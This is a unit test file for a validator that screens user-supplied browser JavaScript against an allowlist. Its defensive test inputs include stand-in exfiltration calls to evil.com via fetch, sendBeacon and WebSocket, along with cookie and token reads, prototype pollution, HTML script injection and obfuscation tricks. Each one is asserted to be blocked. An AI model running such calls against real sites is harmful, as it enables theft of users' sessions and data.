/**
 * Unit Tests for JavaScript Code Whitelist Validator
 *
 * Security Issue: NP-SEC-002
 * Solution ID: SOL-NP-SEC-002-p5n9
 */

import {
  validateJsCode,
  validateJsCodeArray,
  getAllowedOperations,
  getMaxTimeoutMs,
  MAX_SCRIPT_LENGTH,
  MAX_SCRIPTS_COUNT
} from "./js-code.validator";

describe("JsCodeValidator", () => {
  describe("validateJsCode", () => {
    describe("empty and null inputs", () => {
      it("should return valid for undefined input", () => {
        // @ts-expect-error testing invalid input
        const result = validateJsCode(undefined);
        expect(result.valid).toBe(true);
        expect(result.blockedPatterns).toHaveLength(0);
      });

      it("should return valid for null input", () => {
        // @ts-expect-error testing invalid input
        const result = validateJsCode(null);
        expect(result.valid).toBe(true);
        expect(result.blockedPatterns).toHaveLength(0);
      });

      it("should return valid for empty string", () => {
        const result = validateJsCode("");
        expect(result.valid).toBe(true);
        expect(result.blockedPatterns).toHaveLength(0);
      });

      it("should return valid for whitespace-only string", () => {
        const result = validateJsCode("   \n\t  ");
        expect(result.valid).toBe(true);
        expect(result.blockedPatterns).toHaveLength(0);
      });
    });

    describe("allowed safe operations", () => {
      it("should allow window.scrollTo", () => {
        const result = validateJsCode("window.scrollTo(0, 100);");
        expect(result.valid).toBe(true);
      });

      it("should allow window.scrollBy", () => {
        const result = validateJsCode("window.scrollBy(0, 500);");
        expect(result.valid).toBe(true);
      });

      it("should allow document.querySelector", () => {
        const result = validateJsCode('document.querySelector(".content");');
        expect(result.valid).toBe(true);
      });

      it("should allow document.querySelectorAll", () => {
        const result = validateJsCode('document.querySelectorAll("div");');
        expect(result.valid).toBe(true);
      });

      it("should allow document.getElementById", () => {
        const result = validateJsCode('document.getElementById("main");');
        expect(result.valid).toBe(true);
      });

      it("should allow element.click", () => {
        const result = validateJsCode('document.querySelector("button").click();');
        expect(result.valid).toBe(true);
      });

      it("should allow element.scrollIntoView", () => {
        const result = validateJsCode('document.querySelector(".target").scrollIntoView();');
        expect(result.valid).toBe(true);
      });

      it("should allow setTimeout with function", () => {
        const result = validateJsCode("setTimeout(function() { console.log('done'); }, 1000);");
        expect(result.valid).toBe(true);
      });

      it("should allow setTimeout with arrow function", () => {
        const result = validateJsCode("setTimeout(() => console.log('done'), 1000);");
        expect(result.valid).toBe(true);
      });

      it("should allow console.log", () => {
        const result = validateJsCode('console.log("debug message");');
        expect(result.valid).toBe(true);
      });

      it("should allow console.warn", () => {
        const result = validateJsCode('console.warn("warning");');
        expect(result.valid).toBe(true);
      });

      it("should allow complex safe DOM operations", () => {
        const code = `
          const element = document.querySelector('.load-more');
          if (element) {
            element.scrollIntoView({ behavior: 'smooth' });
            setTimeout(() => element.click(), 500);
          }
        `;
        const result = validateJsCode(code);
        expect(result.valid).toBe(true);
      });
    });

    describe("blocked code execution patterns", () => {
      it("should block eval()", () => {
        const result = validateJsCode('eval("alert(1)");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("eval()"))).toBe(true);
      });

      it("should block eval with different spacing", () => {
        const result = validateJsCode('eval  ("alert(1)");');
        expect(result.valid).toBe(false);
      });

      it("should block new Function()", () => {
        const result = validateJsCode('new Function("return 1")();');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("Function"))).toBe(true);
      });

      it("should block Function() constructor", () => {
        const result = validateJsCode('Function("return 1")();');
        expect(result.valid).toBe(false);
      });

      it("should block setTimeout with string argument", () => {
        const result = validateJsCode('setTimeout("alert(1)", 1000);');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("setTimeout with string"))).toBe(true);
      });

      it("should block setInterval with string argument", () => {
        const result = validateJsCode('setInterval("alert(1)", 1000);');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("setInterval with string"))).toBe(true);
      });
    });

    describe("blocked network request patterns", () => {
      it("should block fetch()", () => {
        const result = validateJsCode('fetch("https://evil.com/steal");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("fetch()"))).toBe(true);
      });

      it("should block new XMLHttpRequest()", () => {
        const result = validateJsCode("const xhr = new XMLHttpRequest();");
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("XMLHttpRequest"))).toBe(true);
      });

      it("should block new WebSocket()", () => {
        const result = validateJsCode('new WebSocket("wss://evil.com");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("WebSocket"))).toBe(true);
      });

      it("should block navigator.sendBeacon()", () => {
        const result = validateJsCode('navigator.sendBeacon("https://evil.com", data);');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("sendBeacon"))).toBe(true);
      });
    });

    describe("blocked module import patterns", () => {
      it("should block dynamic import()", () => {
        const result = validateJsCode('import("./malicious.js");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("import"))).toBe(true);
      });

      it("should block import statement", () => {
        const result = validateJsCode('import evil from "./evil.js";');
        expect(result.valid).toBe(false);
      });

      it("should block require()", () => {
        const result = validateJsCode('require("child_process");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("require()"))).toBe(true);
      });
    });

    describe("blocked prototype pollution patterns", () => {
      it("should block __proto__", () => {
        const result = validateJsCode('obj.__proto__.polluted = true;');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("__proto__"))).toBe(true);
      });

      it("should block constructor.prototype", () => {
        const result = validateJsCode("obj.constructor.prototype.polluted = true;");
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("constructor.prototype"))).toBe(true);
      });

      it("should block Object.setPrototypeOf", () => {
        const result = validateJsCode("Object.setPrototypeOf(obj, malicious);");
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("setPrototypeOf"))).toBe(true);
      });

      it("should block Object.defineProperty", () => {
        const result = validateJsCode('Object.defineProperty(obj, "prop", {});');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("defineProperty"))).toBe(true);
      });

      it("should block Reflect.setPrototypeOf", () => {
        const result = validateJsCode("Reflect.setPrototypeOf(obj, malicious);");
        expect(result.valid).toBe(false);
      });
    });

    describe("blocked Node.js patterns", () => {
      it("should block process.*", () => {
        const result = validateJsCode("process.env.SECRET;");
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("process"))).toBe(true);
      });

      it("should block global.*", () => {
        const result = validateJsCode("global.evil = true;");
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("global"))).toBe(true);
      });

      it("should block globalThis.*", () => {
        const result = validateJsCode("globalThis.evil = true;");
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("globalThis"))).toBe(true);
      });
    });

    describe("blocked DOM injection patterns", () => {
      it("should block document.write()", () => {
        const result = validateJsCode('document.write("<script>evil()</script>");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("document.write"))).toBe(true);
      });

      it("should block innerHTML assignment", () => {
        const result = validateJsCode('element.innerHTML = "<script>evil()</script>";');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("innerHTML"))).toBe(true);
      });

      it("should block outerHTML assignment", () => {
        const result = validateJsCode('element.outerHTML = "<div onclick=evil()>";');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("outerHTML"))).toBe(true);
      });

      it("should block insertAdjacentHTML()", () => {
        const result = validateJsCode('element.insertAdjacentHTML("beforeend", "<script>");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("insertAdjacentHTML"))).toBe(true);
      });
    });

    describe("blocked storage access patterns", () => {
      it("should block localStorage", () => {
        const result = validateJsCode('localStorage.getItem("token");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("localStorage"))).toBe(true);
      });

      it("should block sessionStorage", () => {
        const result = validateJsCode('sessionStorage.setItem("data", "value");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("sessionStorage"))).toBe(true);
      });

      it("should block indexedDB", () => {
        const result = validateJsCode('indexedDB.open("mydb");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("indexedDB"))).toBe(true);
      });

      it("should block document.cookie", () => {
        const result = validateJsCode("const cookies = document.cookie;");
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("document.cookie"))).toBe(true);
      });
    });

    describe("blocked script injection patterns", () => {
      it("should block createElement script", () => {
        const result = validateJsCode('document.createElement("script");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("createElement"))).toBe(true);
      });
    });

    describe("blocked obfuscation patterns", () => {
      it("should block unicode escape sequences", () => {
        const result = validateJsCode('const x = "\\u0065val";');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("Unicode escape"))).toBe(true);
      });

      it("should block hex escape sequences", () => {
        const result = validateJsCode('const x = "\\x65val";');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("Hex escape"))).toBe(true);
      });

      it("should block String.fromCharCode", () => {
        const result = validateJsCode("String.fromCharCode(101, 118, 97, 108);");
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("fromCharCode"))).toBe(true);
      });

      it("should block String.fromCodePoint", () => {
        const result = validateJsCode("String.fromCodePoint(101, 118, 97, 108);");
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("fromCodePoint"))).toBe(true);
      });

      it("should block atob()", () => {
        const result = validateJsCode('atob("ZXZhbA==");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("atob"))).toBe(true);
      });

      it("should block btoa()", () => {
        const result = validateJsCode('btoa("sensitive data");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("btoa"))).toBe(true);
      });
    });

    describe("blocked bracket notation access", () => {
      it("should block ['eval'] bracket access", () => {
        const result = validateJsCode('window["eval"]("alert(1)");');
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("bracket access"))).toBe(true);
      });

      it("should block ['Function'] bracket access", () => {
        const result = validateJsCode('window["Function"]("return 1")();');
        expect(result.valid).toBe(false);
      });

      it("should block ['constructor'] bracket access", () => {
        const result = validateJsCode('"".["constructor"]["constructor"]("return 1")();');
        expect(result.valid).toBe(false);
      });
    });

    describe("comment handling", () => {
      it("should detect patterns hidden in single-line comments", () => {
        const code = `
          // This is safe code
          window.scrollTo(0, 100);
        `;
        const result = validateJsCode(code);
        expect(result.valid).toBe(true);
      });

      it("should detect patterns hidden in multi-line comments", () => {
        const code = `
          /* This is a comment
             with multiple lines */
          window.scrollTo(0, 100);
        `;
        const result = validateJsCode(code);
        expect(result.valid).toBe(true);
      });

      it("should still block dangerous code outside comments", () => {
        const code = `
          // This is a comment
          eval("alert(1)"); // dangerous
        `;
        const result = validateJsCode(code);
        expect(result.valid).toBe(false);
      });
    });

    describe("script length validation", () => {
      it("should reject scripts exceeding max length", () => {
        const longScript = "a".repeat(MAX_SCRIPT_LENGTH + 1);
        const result = validateJsCode(longScript);
        expect(result.valid).toBe(false);
        expect(result.blockedPatterns.some((p) => p.includes("maximum length"))).toBe(true);
      });

      it("should accept scripts at max length", () => {
        const maxScript = "a".repeat(MAX_SCRIPT_LENGTH);
        const result = validateJsCode(maxScript);
        expect(result.valid).toBe(true);
      });
    });

    describe("setTimeout timeout validation", () => {
      it("should warn for setTimeout with excessive timeout", () => {
        const result = validateJsCode("setTimeout(() => {}, 15000);");
        expect(result.warnings.some((w) => w.includes("exceeds maximum"))).toBe(true);
      });

      it("should not warn for setTimeout with acceptable timeout", () => {
        const result = validateJsCode("setTimeout(() => {}, 5000);");
        expect(result.warnings).toHaveLength(0);
      });
    });
  });

  describe("validateJsCodeArray", () => {
    it("should return valid for undefined input", () => {
      // @ts-expect-error testing invalid input
      const result = validateJsCodeArray(undefined);
      expect(result.valid).toBe(true);
    });

    it("should return valid for empty array", () => {
      const result = validateJsCodeArray([]);
      expect(result.valid).toBe(true);
    });

    it("should validate all scripts in array", () => {
      const scripts = [
        "window.scrollTo(0, 100);",
        'document.querySelector(".btn").click();'
      ];
      const result = validateJsCodeArray(scripts);
      expect(result.valid).toBe(true);
    });

    it("should reject if any script is invalid", () => {
      const scripts = [
        "window.scrollTo(0, 100);",
        'eval("alert(1)");'
      ];
      const result = validateJsCodeArray(scripts);
      expect(result.valid).toBe(false);
      expect(result.blockedPatterns.some((p) => p.includes("Script[1]"))).toBe(true);
    });

    it("should reject if too many scripts", () => {
      const scripts = Array(MAX_SCRIPTS_COUNT + 1).fill("window.scrollTo(0, 100);");
      const result = validateJsCodeArray(scripts);
      expect(result.valid).toBe(false);
      expect(result.blockedPatterns.some((p) => p.includes("Too many scripts"))).toBe(true);
    });

    it("should accept max number of scripts", () => {
      const scripts = Array(MAX_SCRIPTS_COUNT).fill("window.scrollTo(0, 100);");
      const result = validateJsCodeArray(scripts);
      expect(result.valid).toBe(true);
    });

    it("should aggregate warnings from all scripts", () => {
      const scripts = [
        "setTimeout(() => {}, 15000);",
        "setTimeout(() => {}, 20000);"
      ];
      const result = validateJsCodeArray(scripts);
      expect(result.warnings.length).toBe(2);
    });
  });

  describe("helper functions", () => {
    it("getAllowedOperations should return list of allowed operations", () => {
      const operations = getAllowedOperations();
      expect(operations).toContain("window.scrollTo");
      expect(operations).toContain("document.querySelector");
      expect(operations).toContain("element.click");
      expect(operations).toContain("setTimeout");
      expect(operations).toContain("console.log");
    });

    it("getMaxTimeoutMs should return max timeout value", () => {
      const maxTimeout = getMaxTimeoutMs();
      expect(maxTimeout).toBe(10000);
    });
  });

  describe("case sensitivity", () => {
    it("should block EVAL regardless of case", () => {
      const result = validateJsCode('EVAL("alert(1)");');
      expect(result.valid).toBe(false);
    });

    it("should block Fetch regardless of case", () => {
      const result = validateJsCode('Fetch("https://evil.com");');
      expect(result.valid).toBe(false);
    });
  });

  describe("multiple blocked patterns", () => {
    it("should report all blocked patterns found", () => {
      const code = `
        eval("alert(1)");
        fetch("https://evil.com");
        localStorage.getItem("token");
      `;
      const result = validateJsCode(code);
      expect(result.valid).toBe(false);
      expect(result.blockedPatterns.length).toBeGreaterThanOrEqual(3);
    });
  });
});
